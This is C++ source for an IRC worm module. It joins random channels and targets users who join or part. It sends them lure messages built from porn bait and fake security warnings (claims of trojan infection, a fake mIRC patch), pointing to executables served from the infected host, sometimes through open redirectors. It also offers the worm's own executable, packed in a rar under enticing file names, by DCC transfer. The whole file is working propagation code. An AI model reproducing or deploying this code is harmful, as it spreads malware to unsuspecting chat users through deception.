#include "stdafx.h"
#include "xIrcWorm.h"
#include "prototypes.h"
#include "stdlib.h"
#include "stdio.h"



#define DccTimeout	(60*1000) // 1 minute timeout

char *NickList[]={"Anita","April","Ara","Aretina","Amorita","Alysia","Aldora",
				"Barbra","Becky","Bella","Briana","Bridget","Blenda","Bettina",
				"Caitlin","Chelsea","Clarissa","Carmen","Carla","Cara","Camille",
				"Damita","Daria","Danielle","Diana","Doris","Dora","Donna",
				"Ebony","Eden","Eliza","Erika","Eve","Evelyn","Emily",
				"Faith","Gale","Gilda","Gloria","Haley","Holly","Helga",
				"Ivory","Ivana","Iris","Isabel","Idona","Ida","Julie",
				"Juliet","Joanna","Jewel","Janet","Katrina","Kacey","Kali",
				"Kyle","Kassia","Kara","Lara","Laura","Lynn","Lolita",
				"Lisa","Linda","Myra","Mimi","Melody","Mary","Maia",
				"Nadia","Nova","Nina","Nora","Natalie","Naomi","Nicole",
				"Olga","Olivia","Pamela","Peggy","Queen","Rachel","Rae",
				"Rita","Ruby","Rosa","Silver","Sharon","Uma","Ula",
				"Valda","Vanessa","Valora","Violet","Vivian","Vicky","Wendy",
				"Willa","Xandra","Lesbian","Xenia","Zilya","Zoe","Zenia"
};

const int NumberOfNames=105;

void GetRndUserStr(char *dst,BOOL numbers)
{
	srand(GetTickCount());
	
	if(numbers==TRUE)
	{
		if((rand() % 10)>6)
			wsprintf(dst,"%s%d",NickList[rand() % NumberOfNames],10+(rand() % 20));
		else
			RandomString(dst,5,TRUE);
	}
	else
		wsprintf(dst,"%s",NickList[rand() % NumberOfNames]);
}

void GetDccFileName(char *dst)
{
	char *FileNames[]={"HardCore-XXX-Pictures","Webcam"
					   "Hot_Girls_Sucking_Dicks","Tiny_Woman_Swallows",
					   "Hot-XXX-Pictures-Collection","HiddenXXXPhotos",
					   "YoungFreshPussy","Extream-Hardcore-XXX"
						"FreeAmateurPorno","Hardcore-XXX-Porno",
						"Family_Sex.com","DivXPorno.pif",
						"EuroSex4Free","TrialXXXView",
						"AsianPorno4Free","DixPorno",
						"nude-gallery","jenna_family",
						"porno.pif","Sex4Free",
						"sex-cum-4free","Vivid-Sex"
						"Free-Porno-Gallery","XXX-PORNO-LIBRARY",
						 "SEX-mirc-Access","Free-Hardcore-Sex",
						 "PornPicturesCollection","Vivid_Sex_Trial",
						 "JennaAndKelly","Photos",
						 "Your_Search","LoveMe",
						 "HomeWork","Mp3B0x",
						 "FreeMp3Downloader","CService",
						 "User_Guide","Password_List",
						 "Readme","Mirc_Update",
						 "BecomeIRCOP","Finded"};

	lstrcpy(dst,FileNames[rand() % 41]);
}


void GenUrlSpamMessage(char *dst,char userip[])
{
	int style;
//////////////////////////////////////////////////////////////
	char *s1part1[]={"hey","heya","hi","hello","w00t"};

	char *s1part2[]={"looking for some hot porn ?",
				   "need free porn ?",
				   "wanna see hot girls for free ?",
				   "hardcore xxx porno for free !",
				   "for free porn galerys..."};

	char *s1part3[]={"check out -->",
					 "visit ==>>>",
					 "take a look at ->",
					 "download the free viewer at >"};

	char *s1files[]={"HardCore-XXX-Pictures.scr",
					 "Hot_Girls_Sucking_Dicks.scr",
					 "Tiny_Woman_Swallows.pif",
					 "Hot-XXX-Pictures-Collection.rar",
					 "HiddenXXXPhotos.rar",
					 "YoungFreshPussy.exe",
					 "Extream-Hardcore-XXX.pif"};
///////////////////////////////////////////////////////////////
	char *s2part1[]={"excuse me,but its seems that",
					"its looking like that",
					"hey,i think that",
					"hi,i can see that"};

	char *s2part2[]={"you are infected with a trojan...",
					"you are using a vulnerable version of mirc",
					"your windows is not patched...",
					"your mirc is sending spam",
					"your computer is vulnerable to the new mirc exploit"};

	char *s2part3[]={"please download repair tool from -> ",
					"please install this security update ->",
					"please download a fix from ->",
					"please install the new patch so you will be protected",
					"so get yourself ASAP this repair from"};

	char *s2files[]={"SystemRepair.exe",
					"Fix_Mirc.exe",
					"Trojan-Remover.exe",
					"MircSecurity.exe",
					"Windows_Update.exe",
					"SecurityUpdate.exe",
					"SystemFix.exe",
					"WinXP_Mirc_Fix.exe"};
//////////////////////////////////////////////////////////////////////////

	char *s3part1[]={"ever wanted to have access to",
					"would you like to download",
					"do you want to get yourself",
					"looking for",
					"searching for"};

	char *s3part2[]={"hundred of",
					"good quality",
					"high resolution",
					"a full library of",
					"a full galery of"};

	char *s3part3[]={"hardcore porno",
					 "xxx movies",
					 "porn pictures",
					 "free porno movies",
					 "short porno movies"};

	char *s3part4[]={"if so,just download the free trial viewer from ->",
					 "no need to wait,get the access now from ->",
					 "just double click on :",
					 "just download the free movie from",
					 "check out",
					 "take a look at"};

	char *s3files[]={"Free-Porno-Gallery.exe",
					 "XXX-PORNO-LIBRARY.com",
					 "SEX-mirc-Access.rar",
					 "Free-Hardcore-Sex.rar",
					 "PornPicturesCollection.rar",
					 "Vivid_Sex_Trial.exe",
					 "JennaAndKelly.com"};
////////////////////////////////////////////////////////////////////////////


	char *s4part1[]={"heya","hey","whats up?","hey,how you doing?","hello","hi"};

	char *s4part2[]={"please visit my",
					"take a look at my",
					"what do you think about my",
					"is my","how is my"};
	
	char *s4part3[]={"webcam pictures",
					"nude pictures",
					"gallery",
					"web site",
					"porn movie",
					"family"};

	char *s4part4[]={"and tell me what is your opinion",
					"and tell me what you think,please",
					":)"};

	char *s4files[]={"Webcam.com","nude-gallery.com","jenna_family.scr",
					"porno.pif","Sex4Free.pif","sex-cum-4free.pif","Vivid-Sex.com"};


	char *s4redirectors[]={"http://www.hard-core-dx.com/redirect.php?",
						"http://neworder.box.sk/redirect.php?",
						"http://hornygoat.org/stats/redirect.php?",
						"http://www.google.com/url?q="};

////////////////////////////////////////////////////////////////////////////

	char *s5part1[]={"hey","hello","heya","hi"};

	char *s5part2[]={"You can find DVD Quality Amateur Porn Movies here =>",
					"wanna have a free trial at porn sites all over the world ?,get this =>",
					"wants to have access to free DVD porn download =>",
					"wants free 30 days trial at porn gallerys ?,check out >",
					"intersting in porno ?,wanna get free access,check out -->",
					"free europen porn ! get it now from ===>>>"};

	char *s5redirect[]={"http://www.magadoo.com/goto.php?url=",
						"http://www.spodesabode.com/link.php?url=",
						"http://www.onlyphp.com/redirect.php?url=",
						"http://www.syntechsoftware.com/redirect.php?base=",
						"http://rd.walla.co.il/ts.cgi?i=43132&u=",
						"http://www.rediff.com/rss/redirect.php?url=",
						"http://www.google.com/url?q="};

	char *s5files[]={"FreeAmateurPorno.pif","Hardcore-XXX-Porno.rar",
					"Family_Sex.com","DivXPorno.pif","EuroSex4Free.pif",
					"TrialXXXView.scr","AsianPorno4Free.scr","DixPorno.scr"};


	srand(GetTickCount());

	style=(rand() % 5);

	if(style==1)
		wsprintf(dst,"%s,%s %s http://%s/%s",s1part1[rand() % 5],
		s1part2[rand() % 5],s1part3[rand() % 4],userip,s1files[rand() % 7]);
	else if(style==2)
	{
		wsprintf(dst,"%s %s,%s http://%s/%s",s2part1[rand() % 4],
			s2part2[rand() % 5],s2part3[rand() % 5],userip,s2files[rand() % 8]);
	}	
	else if(style==3)
	{
		wsprintf(dst,"%s %s %s ?,%s http://%s/%s",s3part1[rand() % 5],
			s3part2[rand() % 5],s3part3[rand() % 5],s3part4[rand() % 6],
			userip,s3files[rand() % 7]);
	}
	else if(style==4)
	{
		wsprintf(dst,"%s %s %s,%s %shttp://%s/%s",
			s4part1[rand() % 6],s4part2[rand() % 4],s4part3[rand() % 6],s4part4[rand() % 3],
			s4redirectors[rand() % 4],userip,s4files[rand() % 7]);
	}
	else
	{
		wsprintf(dst,"%s,%s %shttp://%s/%s",s5part1[rand() % 4],s5part2[rand() % 6],
			s5redirect[rand() % 7],userip,s5files[rand() % 8]);
	}


}

BOOL GetNickFromBuffer(char *dst,char xbuffer[])
{	
	int i=0;

	if(xbuffer[0]!=':')
		return FALSE;

	for(i=0;i<lstrlen(xbuffer);i++)
		if(xbuffer[i]=='!')
			goto b_ok1;
	
	return FALSE;

b_ok1:

	for(i=0;i<lstrlen(xbuffer);i++)
		if(xbuffer[i]=='@')
			goto b_ok2;
	
	return FALSE;

b_ok2:
	
	for(i=1;i<15;i++)
	{
		if(xbuffer[i]=='!')
			break;
		dst[i-1]=xbuffer[i];
	}

	dst[i-1]=NULL;

	return TRUE;
}


DWORD WINAPI Dcc_Server(LPVOID xDccInfo)
{
	DCC_SERVER_INFO xDccSrvr;
	WSADATA wsd;
	SOCKET sdcc,sdcc_out;
	sockaddr_in xsin;
	HANDLE hfile;
	SOCKADDR xsockaddr;
	int SizeOfxsa=sizeof(xsockaddr);

	DWORD io_buffer;
	char fb[4096],userip[25];

	memcpy(&xDccSrvr,xDccInfo,sizeof(DCC_SERVER_INFO));

	if(WSAStartup(MAKEWORD(1,1),&wsd)==0)
	{
		sdcc=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
		if(sdcc!=INVALID_SOCKET)
		{
		
			xsin.sin_port=htons(xDccSrvr.port);
			xsin.sin_family=AF_INET;
			xsin.sin_addr.s_addr=INADDR_ANY;

			if(bind(sdcc,(sockaddr *)&xsin,sizeof(xsin))!=SOCKET_ERROR)
			{
				if(listen(sdcc,1)!=SOCKET_ERROR)
				{
					sdcc_out=accept(sdcc,NULL,NULL);
					
					if(sdcc_out!=INVALID_SOCKET)
					{
						hfile=CreateFile(xDccSrvr.FileToSend,GENERIC_READ,FILE_SHARE_READ,
						 NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);

						if(hfile!=INVALID_HANDLE_VALUE)
						{
							do
							{
								if(ReadFile(hfile,&fb,sizeof(fb),&io_buffer,NULL)==TRUE)
									send(sdcc_out,fb,io_buffer,0);
							}
							while(io_buffer>0);

							CloseHandle(hfile);
						}

						Sleep(5000);	//wait before closing the socket !

						getsockname(sdcc_out,&xsockaddr,&SizeOfxsa);

						wsprintf(userip,"%d.%d.%d.%d",(BYTE)xsockaddr.sa_data[2],
								(BYTE)xsockaddr.sa_data[3],(BYTE)xsockaddr.sa_data[4],
								(BYTE)xsockaddr.sa_data[5]);	//get user ip string

						AddToLog(userip,Duel_Log_Irc_File_Upload,TRUE);

						closesocket(sdcc_out);
					}
				}
			}

			closesocket(sdcc);
		}
	}	
	return 1;
}


DWORD WINAPI SendDccRequest(LPVOID xDccInfo)
{
	DCCInfo xDcc_Info;
	char xIrcBuffer[140],userip[25];
	SOCKADDR xsockaddr;
	int SizeOfxsa=sizeof(xsockaddr);
	int dccport=0,filesize=0;
	BOOL FileSending=FALSE;
	DCC_SERVER_INFO DccServer_Info;
	char filename[30],tempbuf[MAX_PATH];
	char xtmprar[MAX_PATH],packedfile[40];
	WIN32_FIND_DATA wfd;
	HANDLE hdccsrvr;

	memcpy(&xDcc_Info,xDccInfo,sizeof(DCCInfo));

	if(xDcc_Info.OveRideIp==TRUE)
	{
		lstrcpy(userip,xDcc_Info.Oip);
	}
	else
	{
		getsockname(xDcc_Info.xsocket,&xsockaddr,&SizeOfxsa);

		wsprintf(userip,"%d.%d.%d.%d",(BYTE)xsockaddr.sa_data[2],
			(BYTE)xsockaddr.sa_data[3],(BYTE)xsockaddr.sa_data[4],
			(BYTE)xsockaddr.sa_data[5]);	//get user ip string
	}

	srand(GetTickCount());		//randomize !

	dccport=(1000+(rand() % 200));	//random port between 1000 ~ 1200

	GetDccFileName(filename);		//get a file name

	GetTempPath(MAX_PATH,tempbuf);
	
	wsprintf(xtmprar,"%s%x%x%x%x.tmp",tempbuf,
		(rand() % 50),(rand() % 50),(rand() % 50),(rand() % 50));

	GetModuleFileName(NULL,tempbuf,MAX_PATH);

	lstrcpy(packedfile,filename);
	lstrcat(packedfile,".exe");

	if(AddToRar(xtmprar,tempbuf,packedfile,FILE_ATTRIBUTE_NORMAL)==TRUE)
	{

		FindClose(FindFirstFile(xtmprar,&wfd));	//use FindFirstFile to get the file size

		filesize=wfd.nFileSizeLow;

		lstrcpy(DccServer_Info.FileToSend,xtmprar);	//setup file name
		DccServer_Info.port=dccport;	//setup port
		DccServer_Info.FileSending=&FileSending;	//setup pointer to status

		hdccsrvr=XThread(Dcc_Server,&DccServer_Info);	//start a dcc server

		wsprintf(xIrcBuffer,"NOTICE %s :DCC send %s.rar (%s)\r\n",
			xDcc_Info.xNick,filename,userip);		//dcc notice
	
		send(xDcc_Info.xsocket,xIrcBuffer,lstrlen(xIrcBuffer),0);
	
		wsprintf(xIrcBuffer,
			"PRIVMSG %s :%cDCC SEND %s.rar %d %d %d%c\r\n",
			xDcc_Info.xNick,1,filename,htonl(inet_addr(userip)),
			dccport,filesize,1);//send dcc request
	
		send(xDcc_Info.xsocket,xIrcBuffer,lstrlen(xIrcBuffer),0);

		WaitForSingleObject(hdccsrvr,DccTimeout);		//wait for the server to finish

		TerminateThread(hdccsrvr,1);

		CloseHandle(hdccsrvr);

		DeleteFile(xtmprar);
	}

	return 1;
}


DWORD WINAPI SendSpamUrl(LPVOID xSpamInfo)
{
	SpamInfo xSiNFO;
	SOCKADDR xsockaddr;
	int SizeOfxsa=sizeof(xsockaddr);
	char userip[21];
	char msg[200];
	char xIrcBuffer[256];

	memcpy(&xSiNFO,xSpamInfo,sizeof(SpamInfo));

	srand(GetTickCount());

	if(xSiNFO.OveRideIp==TRUE)
	{
		lstrcpy(userip,xSiNFO.Oip);
	}
	else
	{
		getsockname(xSiNFO.xsocket,&xsockaddr,&SizeOfxsa);

		wsprintf(userip,"%d.%d.%d.%d",(BYTE)xsockaddr.sa_data[2],
			(BYTE)xsockaddr.sa_data[3],(BYTE)xsockaddr.sa_data[4],
			(BYTE)xsockaddr.sa_data[5]);	//get user ip string
	
	}

	GenUrlSpamMessage(msg,userip);		//generate spam message

	wsprintf(xIrcBuffer,"PRIVMSG %s :%s\r\n",xSiNFO.nick2spam,msg);

	if(xSiNFO.AutoSpam==FALSE)
		Sleep((rand() % 10)*1000);
	
	send(xSiNFO.xsocket,xIrcBuffer,lstrlen(xIrcBuffer),0);
	
	return 1;
}

void xIrcWorm::InitWorm(char IrcServer[],int port)
{
	lstrcpy(Irc_Server,IrcServer);
	Irc_Port=port;
	number_of_channels=0;
	OverRideIP=FALSE;
}

int xIrcWorm::myrecv(BOOL GetLine)
{
	int i=0,retval;
	char recvied[1];

	memset(buffer,0,sizeof(buffer));					//zero buffer

	if(GetLine==FALSE)
		return(recv(Irc_Socket,buffer,sizeof(buffer),0));
	
	do
	{
		
		retval=recv(Irc_Socket,(char *)recvied,1,0);
		
		if(retval==0 || retval==INVALID_SOCKET)
			break;

		buffer[i]=recvied[0];

		i++;

		if(recvied[0]==0xD)
			break;

	}while(retval!=0 && retval!=INVALID_SOCKET);

	return(retval);	//recv & return
}


BOOL xIrcWorm::StartWorm()
{
	WSADATA wsd;
	LPHOSTENT	xhostnt;
	sockaddr_in	xsin;
	char user[20],realname[30],nick[20],*p1=NULL,ping_id[50];
	int i=0,retval;
	char szList[20],response[4],kicked_nick[20],rndstr[20];
	SOCKADDR xsockaddr;
	int SizeOfxsa=sizeof(xsockaddr);
	SpamInfo xSpamInfo;
	DCCInfo  xDccInfo;

	if(WSAStartup(MAKEWORD(1,1),&wsd)==0)
	{
		Irc_Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);		//create socket
	
		if(Irc_Socket!=INVALID_SOCKET)
		{
			xhostnt=gethostbyname(Irc_Server);		//dns irc server
			
			if(xhostnt!=NULL)
			{
				xsin.sin_family=AF_INET;
				xsin.sin_port=htons(Irc_Port);
				xsin.sin_addr=*((LPIN_ADDR)*xhostnt->h_addr_list);

				if(connect(Irc_Socket,(LPSOCKADDR)&xsin,
					sizeof(struct sockaddr))!=SOCKET_ERROR)	//connect server
				{

					Sleep(3000);	//sleep 3 seconds
					myrecv(FALSE);
					
					RandomString(user,8,FALSE);
					RandomString(rndstr,5,TRUE);
					GetRndUserStr(realname,FALSE);
					lstrcat(realname,rndstr);
					GetRndUserStr(nick,TRUE);

					wsprintf(buffer,"USER %s 8 * :%s\r\n",user,realname);
					send(Irc_Socket,buffer,lstrlen(buffer),0);
					wsprintf(buffer,"NICK %s\r\n",nick);
					send(Irc_Socket,buffer,lstrlen(buffer),0);

					myrecv(FALSE);

					p1=strstr(buffer,"PING :");

					if(p1!=NULL)		//some servers sending ping right after user registion
					{
						p1+=6;
						i=0;
						do
						{
							ping_id[i]=*p1;
							i++;
							p1++;
						}while(*p1!=0xd);

						wsprintf(buffer,"PONG %s\r\n",ping_id);			//build PONG command
						send(Irc_Socket,buffer,lstrlen(buffer),0);		//send PONG command

						myrecv(FALSE);								//recive message from server

					}

					p1=strstr(buffer,"001");

					if(p1!=NULL)
					{
		
						if(getsockname(Irc_Socket,&xsockaddr,&SizeOfxsa)==0)
						{

							if((BYTE)xsockaddr.sa_data[2]==192)	//is LAN ip ?
							{
								//if we got lan ip,try to get the ip from the irc server
								wsprintf(buffer,"USERIP %s\r\n",nick);
								send(Irc_Socket,buffer,lstrlen(buffer),0);
							
								myrecv(FALSE);

								p1=strstr(buffer,"@");
								
								if(p1!=NULL)
								{
									i=0;
									p1++;
									do
									{
										xIp[i]=*p1;
										p1++;
										i++;

										if(i>16)
											break;
									}while(*p1!=0x0D);

									xIp[i]=NULL;

									OverRideIP=TRUE;
								}
							}

						}


						wsprintf(szList,"LIST >%d\r\n",
							(rand() % 50)+(rand() % 100)); // build a list command
	

						send(Irc_Socket,szList,lstrlen(szList),0);
						
						retval=myrecv(TRUE);

						do
						{
							p1=buffer;

							do
							{
								p1++;
							}while(*p1!=0x20);

							i=0;

							do
							{
								p1++;
								response[i]=*p1;
								i++;
							}while(*p1!=0x20);

							response[3]=NULL;

							if(lstrcmp(response,"322")==0)	// RPL_LIST
							{
								do
								{
									p1++;
								}while(*p1!=0x20);

								p1++;
								i=0;

								do
								{
									channels_list[number_of_channels][i]=*p1;
									p1++;
									i++;
								}while(*p1!=0x20);		//copy channel name
								
								channels_list[number_of_channels][i]=NULL;

								number_of_channels++;

								if(number_of_channels>74)
								{
									lstrcpy(szList,"LIST STOP\r\n");
									send(Irc_Socket,szList,lstrlen(szList),0);
									break;
								}
							}
							
							else if(lstrcmp(response,"323")==0)	//RPL_LISTEND
								break;
							

							retval=myrecv(TRUE);

						}while(retval != 0 && retval!=INVALID_SOCKET);


						for(i=0;i<7;i++)	//join 6 random channels
						{
							wsprintf(buffer,"JOIN %s\r\n",
								channels_list[rand() % number_of_channels]);
							send(Irc_Socket,buffer,lstrlen(buffer),0);
						}


						retval=myrecv(TRUE);


						while(retval != 0 && retval != INVALID_SOCKET)
						{


							//process ping message
							p1=strstr(buffer,"PING :");

							if(p1!=NULL)
							{
								p1+=6;
								i=0;
								do
								{
									ping_id[i]=*p1;
									i++;
									p1++;
								}while(*p1!=0xd);
	
								wsprintf(buffer,"PONG %s\r\n",ping_id);//build PONG command
								send(Irc_Socket,buffer,lstrlen(buffer),0);//send PONG command
							
								goto do_recv;
							}

							//detect part / join

							if(strstr(buffer,"JOIN")!=NULL)
							{
								//process JOIN
								if(GetNickFromBuffer(xSpamInfo.nick2spam,buffer)==TRUE)
								{
									if(lstrcmp(nick,xSpamInfo.nick2spam)!=0)
									{
										srand(GetTickCount());

										if((rand() % 10)>4)	//select between spam or dcc
										{
											xSpamInfo.xsocket=Irc_Socket;
											xSpamInfo.AutoSpam=FALSE;

											if(OverRideIP==TRUE)
											{
												xSpamInfo.OveRideIp=TRUE;
												lstrcpy(xSpamInfo.Oip,xIp);
											}
											else
												xSpamInfo.OveRideIp=FALSE;

											XThread(SendSpamUrl,&xSpamInfo);
									
										}
										else
										{
											xDccInfo.xsocket=Irc_Socket;
											
											if(OverRideIP==TRUE)
											{
												xDccInfo.OveRideIp=TRUE;
												lstrcpy(xDccInfo.Oip,xIp);
											}
											else
												xDccInfo.OveRideIp=FALSE;

											lstrcpy(xDccInfo.xNick,xSpamInfo.nick2spam);

											XThread(SendDccRequest,&xDccInfo);
										}


									}
								}
							}
							else if(strstr(buffer,"PART")!=NULL)
							{
									//process PART
								if(GetNickFromBuffer(xSpamInfo.nick2spam,buffer)==TRUE)
								{
									if(lstrcmp(nick,xSpamInfo.nick2spam)!=0)
									{									
										xSpamInfo.xsocket=Irc_Socket;
										xSpamInfo.AutoSpam=TRUE;

										if(OverRideIP==TRUE)
										{
											xSpamInfo.OveRideIp=TRUE;
											lstrcpy(xSpamInfo.Oip,xIp);
										}
										else
											xSpamInfo.OveRideIp=FALSE;

										XThread(SendSpamUrl,&xSpamInfo);
									}
								}
							}
							else if (strstr(buffer,"KICK")!=NULL)
							{
								//process KICK
								
								p1=strstr(buffer,"KICK");

								if(p1!=NULL)
								{
									p1+=5;

									if(*p1=='#')
									{
										do
										{
											p1++;
										}while(*p1!=0x20);
										
										i=0;

										do
										{
											p1++;
											kicked_nick[i]=*p1;
											i++;
										}while(*p1!=0x20);
								
										kicked_nick[i-1]=NULL;

										if(lstrcmp(kicked_nick,nick)==0)
										{
											//if kicked join new channel

											wsprintf(buffer,"JOIN %s\r\n",
												channels_list[rand() % number_of_channels]);
						
											send(Irc_Socket,buffer,lstrlen(buffer),0);
										}
									}
								}
							}

do_recv:
							retval=myrecv(FALSE);

						}
					
					
					}
				}
			}
			closesocket(Irc_Socket);
		}
	}
	return FALSE;
}